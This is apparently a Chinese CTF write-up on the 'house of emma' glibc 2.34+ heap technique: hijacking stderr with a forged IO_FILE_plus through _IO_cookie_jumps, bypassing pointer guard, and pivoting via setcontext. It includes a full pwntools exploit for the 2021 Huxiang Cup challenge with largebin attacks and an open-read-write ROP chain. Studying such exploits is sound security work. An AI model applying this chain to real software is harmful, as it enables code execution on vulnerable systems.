@@ -1,0 +1,427 @@
+## 00 Why use this methoddy
+
+  
+ **glibc2.34** 及其以上取消了 **malloc_hook**
+，以及free_hook，导致传统的利用方式无法使用，而通过emma的调用链我们只需要构造一个 **IO_FILE_plus**
+结构就可以getshell(没有禁用execve时，禁用也可以构造orw链获取flag)，且使用条件并不苛刻
+
+## 01 前置知识
+
+  1. largebin attack
+
+  2. house of wiki
+
+  3. 熟悉io file exploit
+
+  
+ **emma利用的前置条件**  
+\- 任意地址写入一个可控地址  
+\- 可以触发IO流
+
+## 02 emma理论知识与利用分析
+
+glibc2.24及其以上版本，vtable都会放进一个段中，在进行跳转的时候会调用IO_validate_vtable()函数进行对vtable指针进行边界检查，若不在该段范围则调用_IO_vtable_check()函数做进一步检查  
+![image.png](https://image.3001.net/images/20221030/1667112530_635e1e529b0fc0cf9b8d4.png!small)
+
+ **gdb中可以直接打印出函数的检查时用到的地址**  
+![image.png](https://image.3001.net/images/20221030/1667112558_635e1e6e0142a118bf386.png!small)
+
+ ~~本文不对检查函数进行讲解，~~  
+_IO_vtable_check()在glibc->libio->vtables.c中定义  
+IO_validate_vtable()在glibc->libio->libioP.h中定义
+
+  
+在vtable的检查范围之内有_IO_cookie_jumps，他包含了以下地址
+
+![image.png](https://image.3001.net/images/20221030/1667112602_635e1e9a473fbe3ed93f3.png!small)
+
+其中有这几个危险函数，IO_cookie_read/write/seek/close，里面都有任意函数call，下面列出一个举例，这些函数都定义在`glibc->libio->iofopencook.c`，  
+ **划重点！！！：我们不仅可以控制call什么地址，其rdi的值我们也可以控制** ，下面讲解使用的两个gadget十分重要
+
+![image.png](https://image.3001.net/images/20221030/1667112632_635e1eb86b0f1940ee7a1.png!small)
+
+可以看出_IO_cookie_file是_IO_FILE_plus的一个扩展  
+![image.png](https://image.3001.net/images/20221030/1667112655_635e1ecf587182cfe618e.png!small)
+
+这四个指针对应这执行上面列出的个函数对应call的地址  
+![image.png](https://image.3001.net/images/20221030/1667112669_635e1eddb75463e9271ef.png!small)
+
+这时可以劫持fp(io_file_plus)，进行精心的构造，就可以call任意地址  
+若程序禁用了(execve())，可以打orw，利用emma打orw的话，我们需要思考利用这个call任意地址要call什么，NX开启的情况下我们不能直接写shellcode然后call，这里就要考虑call一个gadget完成栈迁移并执行布置的orw  
+下面是setcontext+61和setcontext+294，其可以控制大多数寄存器，其最重要的是可以进行栈迁移，只要rdx+0xa0为我们布置的orw，且rdx+0xa0为ret(或者是可以回到我们前面布置的orw)，就可以获取flag  
+![image.png](https://image.3001.net/images/20221030/1667112688_635e1ef0841ff8a7d50f7.png!small)
+
+![image.png](https://image.3001.net/images/20221030/1667112714_635e1f0a48c9fcde87ad1.png!small)
+
+  
+现在衍生出了一个新的问题，怎么控制rdx为我们给对应寄存器布置的地址，所以还需要借助一个gadget，call任意地址其rdi我们也是可以控制的如果忘记可以回溯上面的
+**划重点** ，所以我们还要寻找一个即可以通过rdi赋值给rdx且还能够执行我们布置orw，下图gadget就符合上面的要求十分好使
+
+![image.png](https://image.3001.net/images/20221030/1667112738_635e1f2216bc32c22fe30.png!small)
+
+现在的思路就是
+
+  1. 劫持对应指针如stderr指针为我们精心构造的fake_io
+
+  2. 触发io流，执行上面的危险函数，下图是io_cookie_write函数的汇编实现代码，只要布置好rdi+0xf0和rdi为call分别为`mov edx，dword ptr [rdi+8]·······`与`setcontext+61`(使用不同危险函数其偏移可能不一样)  
+![image.png](https://image.3001.net/images/20221030/1667112853_635e1f954c58a0a96386c.png!small)
+
+  3. 通过gadget执行布置的orw获取flag(未禁用execve时可以直接getshell)
+
+这里解释一下为什么网上会说house of
+kiwi是emma的前置知识，在emma出现前kiwi采用的调用链一般是通过exit函数触发io链，再通过setcontext这个gadget进行利用，而emma大多数时也是采用setcontext这个链
+
+### kiwi链
+
+glibc里面有一个assert()宏(值得注意的是作者在vscode里面转跳会调到assert.h里面的定义，实际上使用的是malloc.c里面的定义)
+
+![image.png](https://image.3001.net/images/20221030/1667113029_635e204506793d61692d9.png!small)
+
+可以看到存在两个io流，作者下面的湖湘杯题解和官方wp题解用的是第一个，第二个相对跟踪简单，不过下面继续跟踪则使用第一个  
+![image.png](https://image.3001.net/images/20221030/1667113046_635e20563e75a26a10d89.png!small)
+
+![image.png](https://image.3001.net/images/20221030/1667113061_635e2065694acb6cb34af.png!small)
+
+![image.png](https://image.3001.net/images/20221030/1667113075_635e207352c2e7d050f9f.png!small)
+
+该函数只截取了部分，`# define vfprintf __vfprintf_internal`  
+![image.png](https://image.3001.net/images/20221030/1667113096_635e20889d415ce0909cd.png!small)
+
+![image.png](https://image.3001.net/images/20221030/1667113108_635e2094a6385ea4b6f7c.png!small)
+
+下图为vfprintf函数的关键部分，其所在位置为`glibc->stdio-common->fprint_internal.c`
+
+![image.png](https://image.3001.net/images/20221030/1667113433_635e21d90aa3918b8d80a.png!small)  
+只列出函数利用的关键部分，可以看到只要我们构造fp其if判断大于0就ok了(如果这里看不明白的话说明io file不熟悉)  
+![image.png](https://image.3001.net/images/20221030/1667113454_635e21eeb83e18b7410db.png!small)
+
+IO_sputn为
+*(vtable+0x38)，当然我们劫持stderr指针后，目的要执行危险函数，上面说到过vtable检查范围里面有_IO_cookie_jumps，里面包含危险函数地址，我们只需要控制vtable和偏移就可以执行危险函数，这就是触发io流的关键所在，现在就和上面串起来了
+
+gdb的动态追踪io流，exp会给出对应断点，师傅们可以自行调试
+
+emma的大致流程如上，使用危险函数还需要绕过一个保护，第一个框下面的PTR_DEMANGLE(可以理解为加密指针)，该保护默认是打开的，可以直接看下面的汇编代码了解  
+![image.png](https://image.3001.net/images/20221030/1667113480_635e22081621460002f87.png!small)
+
+拿到指针后将其循环右移0x11位后再和fs:0x30的值进行xor运算，调试可知fs:0x30在tls上，我们只需要将这个未知的值改写成已知的，后面在io布置地址的时候将要执行的地址进行逆运算，左移0x11位后再xor，就可以绕过保护  
+![image.png](https://image.3001.net/images/20221030/1667113498_635e221a6cb441b12534f.png!small)
+
+## 03 实例讲解
+
+### 2021湖湘杯 house of emma
+
+#### 题目分析
+
+  1. 程序每次循环都会创建和释放0x2000大小的chunk
+
+  2. unk_1289(s)函数，转跳过去jumpout了，作者的解决方法是gdb调试到该位置后得知call一个地址，在ida里面找到对应地址 `p`(意思为使该地址为函数入口，`f5`后如下)，但是重点在于读汇编
+
+![image.png](https://image.3001.net/images/20221030/1667113557_635e225565a03c08e9bd3.png!small)  
+3\. 红色部分为while循环，绿色的转跳部分如果转跳通过汇编不是特别清楚建议gdb调试  
+![image.png](https://image.3001.net/images/20221030/1667113572_635e22648f7fc2e55c59f.png!small)
+
+会根据我们在chunk_s中输入的内容进行对应的转跳，框出的地方为执行完函数之后将我们输入chunk_s的内容进行移动到下一条指令，最后的  
+`jmp short locret_149a`，对应着编号5，作用在于回到主函数的循环进行第二次输入  
+![image.png](https://image.3001.net/images/20221030/1667113588_635e227445862ba4d6b29.png!small)
+
+程序限制如下如下：
+
+  1. malloc(0x410-0x500),最多16个chunk
+
+  2. 释放函数有uaf漏洞  
+![image.png](https://image.3001.net/images/20221030/1667113610_635e228a7168c6990b664.png!small)
+
+  3. 因为uaf的缘故导致show函数可以puts出已经释放的内容，可以直接泄露出heap，libc_base  
+![image.png](https://image.3001.net/images/20221030/1667113624_635e22989980df7a28827.png!small)
+
+  4. edit函数，有uaf漏洞导致我们也可以向释放了的chunk写入内容  
+![image.png](https://image.3001.net/images/20221030/1667113637_635e22a58bde51a31ff66.png!small)
+
+### 解题思路
+
+  1. 申请并释放一个chunk使其进入unsorted bin后打印得到libc_base
+
+  2. 将unsorted bin中的chunk放入largebin中后打印fd_nextsize得到heap地址
+
+  3. 通过largebin attack修改stderr的指针为可控堆块并进行伪造
+
+  4. 通过largebin attack修改fs:0x30的值为已知堆块
+
+  5. 触发assert断言以此触发house of kiwi流(这里选择触发的是sysmalloc内的assert断言)  
+![image.png](https://image.3001.net/images/20221030/1667113655_635e22b74e94c8cc35d03.png!small)  
+只需要pre_inuse位为0即可，所以只需要改写top_chunk
+size为小于0x2000的数即可（具体size改成多少需要看后面触发sysmalloc时申请的chunk）  
+![image.png](https://image.3001.net/images/20221030/1667113671_635e22c75bab0f52b1cd9.png!small)
+
+  6. 执行orw即获取flag，我们寻找sysmalloc；ret gadget的时候需要注意，必须是sysmalloc后面接着ret才行，使用ROPgadget作者没有找到，使用的ropper找到了该gadget
+
+本文作者exp
+
+    
+    
+    from pwn import *
+    context.update(os='linux',arch='amd64',log_level='debug')
+    #c=remote(b'node4.buuoj.cn',29430)
+    c=process(b'./house_of_emma')
+    
+    libc=ELF(b'./libc.so.6')
+    
+    gdb.attach(c,'''
+    
+    
+    b *$rebase(0x13e9)
+    b *$rebase(0x1410)
+    b *$rebase(0x1434)
+    b *$rebase(0x1458)
+    b sysmalloc
+    b __malloc_assert
+    b __fxprintf
+    b __vfxprintf
+    b locked_vfxprintf
+    b __vfprintf_internal
+    b *&__vfprintf_internal+261
+    
+    
+    ''')
+    
+    all_py=b''
+    
+    
+    def ROL(content,n):
+        num = bin(content)[2:].rjust(64, '0')
+        return int(num[n:] + num[:n], 2)
+    
+    
+    
+    def add(idx,size):	#malloc(0x420-0x500)
+    	global all_py
+    	py=p8(1)
+    	py+=p8(idx)
+    	py+=p16(size)
+    	all_py+=py
+    	
+    def free(idx):
+    	global all_py
+    	py=p8(2)
+    	py+=p8(idx)
+    	all_py+=py
+    	
+    
+    def show(idx):
+    	global all_py
+    	py=p8(3)
+    	py+=p8(idx)
+    	all_py+=py
+    	
+    
+    def edit(idx,buf):
+    	global all_py
+    	py=p8(4)
+    	py+=p8(idx)
+    	py+=p16(len(buf))
+    	py+=buf
+    	all_py+=py
+    	
+    
+    def run():
+    	global all_py
+    	all_py+=p8(5)
+    	c.sendafter(b'Pls input the opcode',all_py)
+    	all_py=b''
+    	
+    
+    
+    #leak libc_base
+    
+    add(0,0x410)
+    add(1,0x410)
+    add(2,0x420)
+    add(3,0x420)
+    add(4,0x410)
+    add(5,0x450)
+    free(1)
+    show(1)
+    add(1,0x410)
+    run()
+    
+    c.recv(1)
+    libc_base=u64(c.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x1f2cc0
+    log.success("libc_base="+hex(libc_base))
+    log.success("stderr="+hex(libc_base+libc.sym['stderr']))
+    
+    
+    
+    #leak heap_addr
+    
+    free(2)
+    free(4)
+    add(6,0x430)
+    show(2)
+    add(4,0x410)
+    run()
+    
+    
+    c.recvuntil(b'Malloc Done')
+    c.recv(1)
+    chunk4=u64(c.recv(6).ljust(8,b'\x00'))
+    log.success("chunk4="+hex(chunk4))
+    
+    
+    pop_rsi=0x0000000000037c0a
+    pop_rdi=0x000000000002daa2
+    pop_rdx_xxx=0x00000000001066e1
+    stderr=0x7f1d5d50c680
+    
+    
+    #largebin attack stderr  (chunk2)
+    
+    chunk2=chunk4-0x430*2
+    chunk0=chunk2-0x420*2
+    
+    log.success("chunk2="+hex(chunk2))
+    log.success("chunk0="+hex(chunk0))
+    largebin0=libc_base+0x1f30b0
+    log.success("stderr="+hex(libc_base+libc.sym['stderr']))
+    
+    edit(2,p64(largebin0)*2+p64(chunk2)+p64(libc_base+libc.sym['stderr']-0x20))
+    free(0)
+    add(7,0x460)
+    run()
+    
+    
+    #largebin attack guard  (chunk0)
+    
+    
+    guard=libc_base-10384#此地址为fs:0x30,ld与libc的偏移一般和本地不一样，需要手动爆破，可以参考官方wp
+    
+    
+    add(0,0x410)
+    edit(2,p64(largebin0)*2+p64(chunk2)+p64(guard-0x20))
+    free(0)
+    add(8,0x460)
+    edit(0,p64(largebin0)+p64(chunk2)+p64(chunk2)*2)#repair，请看回答1
+    edit(2,p64(chunk0)+p64(largebin0)+p64(chunk0)*2)#repair
+    
+    run()
+    
+    
+    #trigger the assert()
+    
+    add(0,0x410)
+    add(2,0x420)
+    
+    free(8)
+    add(9,0x450)
+    edit(8,b'a'*0x458+p64(0x300))    #修改top_size为0x300
+    run()
+    
+    # 
+    gadget_addr=libc_base+0x0000000000146020# mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
+    srop_addr=chunk0+0x10
+    setcontext=libc_base+libc.sym['setcontext']
+    
+    
+    Fake_IO_FILE_PLUS=2*p64(0)
+    Fake_IO_FILE_PLUS+=p64(0) 	#_IO_write_ptr
+    Fake_IO_FILE_PLUS+=p64(0xffffffffffffffff)	#_IO_write_ptr
+    Fake_IO_FILE_PLUS+=p64(0)
+    Fake_IO_FILE_PLUS=Fake_IO_FILE_PLUS.ljust(0x58,b'\x00')
+    Fake_IO_FILE_PLUS+=p64(libc_base+libc.sym['stdout'])    #可以为0
+    Fake_IO_FILE_PLUS=Fake_IO_FILE_PLUS.ljust(0x78,b'\x00')
+    Fake_IO_FILE_PLUS+=p64(chunk4)	#_lock，    #请看回答2
+    Fake_IO_FILE_PLUS=Fake_IO_FILE_PLUS.ljust(0xc8,b'\x00')
+    Fake_IO_FILE_PLUS+=p64(libc_base+libc.sym['_IO_cookie_jumps']+0x40)		#vtable
+    Fake_IO_FILE_PLUS+=p64(srop_addr)		#srop，rdi
+    Fake_IO_FILE_PLUS+=p64(0)
+    Fake_IO_FILE_PLUS+=p64(ROL(gadget_addr^(chunk0),0x11))
+    
+    
+    pop_rdi=libc_base+0x000000000002daa2
+    pop_rsi=libc_base+0x0000000000037c0a
+    pop_rdx_xxx=libc_base+0x00000000001066e1
+    pop_rax=libc_base+0x00000000000446c0
+    syscall=libc_base+0x00000000000883b6
+    ret=pop_rdi+1    #ret
+    
+    fake_frame_addr=srop_addr
+    
+    orw= [
+    
+    	pop_rax,    #sys_open()
+    	2,
+    	pop_rsi,
+    	0,
+    	pop_rdx_xxx,
+    	0,
+    	0,
+    	syscall,
+    	
+    	
+    	pop_rax,    #sys_read()
+    	0,
+    	pop_rdi,
+    	3,
+    	pop_rsi,
+    	fake_frame_addr+0x200,
+    	pop_rdx_xxx,
+    	0x100,
+    	0,
+    	syscall,
+    	
+    	
+    	pop_rax,    #sys_write
+    	1,
+    	pop_rdi,
+    	1,
+    	pop_rsi,
+    	fake_frame_addr+0x200,
+    	syscall
+    
+    ]
+    
+    
+    py=p64(0)+p64(fake_frame_addr)+b'\x00'*0x10+p64(setcontext+61)
+    
+    py=py.ljust(0x68,b'\x00')
+    
+    py+=p64(fake_frame_addr+0x70)+b'flag'.ljust(0x10,b'\x00')
+    
+    py=py.ljust(0xa0,b'\x00')
+    
+    py+=p64(fake_frame_addr+0xb0)+p64(ret)+flat(orw)
+    
+    edit(2,Fake_IO_FILE_PLUS)    #stderr被修改为chunk2，所以布置fake_io在chunk2
+    edit(0,py)
+    add(10,0x450)    #top_size已经被修改为0x300故申请大于0x300即可(只要不是申请free_chunk都可)
+    run()
+    c.interactive()
+    
+
+**回答1：**上面修复chunk0，chunk2的原因是，我们largebin
+attack本来修改成的内容是chunk2，但是因为每次执行完之后程序会释放chunk_s且申请出来，chunk_0与chunk_s接壤会触发向前合并因为下面的语句导致修改成chunk0  
+，若不修复下面进行申请和释放的时候会因为保护检查而报错
+
+![image.png](https://image.3001.net/images/20221030/1667113842_635e23721cb611a706085.png!small)
+
+**回答2：**伪造fake_io的时候_lock地址只需要修改成具有可写权限的地址即可，或者不上锁，直接绕过汇编判断也是可以的主要目的是为了安全进去利用函数如下，因为前面爆破出了地址所以我们是可以让这个判断相等也可以进入正确进入利用流中，还是建议随便写一个有写入权限的地址(简单)
+
+![image.png](https://image.3001.net/images/20221030/1667113853_635e237de7e3f39334d43.png!small)
+
+注意：构造fake_io时需要注意，我们构造的时候是从chunk2+0x10开始写的如果不注意可能会偏差0x10，还需要注意我们p
+_IO_2_1_stderr_ ，看到的结构不能够手动去数，因为有些变量并不是8字节，他们进行了内存对齐，所以需要x/gx来对照进行伪造
+
+之前看的时候一直很疑惑，加上csdn上有一篇说执行setcontext后正常调用srop和orw，实际上根本就没有调用srop只是该exp使用了SigreturnFrame里面的几个地址=-=，师傅们可以拿这段和我上面的py对照是一个意思  
+![image.png](https://image.3001.net/images/20221030/1667113874_635e23924c2f33eba49f0.png!small)
+
+  
+参考文章：
+
+[house of emma官方文章](https://bbs.pediy.com/thread-270429.htm#msg_header_h3_2)  
+[house of kiwi](https://www.anquanke.com/post/id/235598)
+
+  
+如有错误请联系我  
+qq：2223242484  
+wx：hhg2223242484  
+邮箱：2223242484@qq.com
+
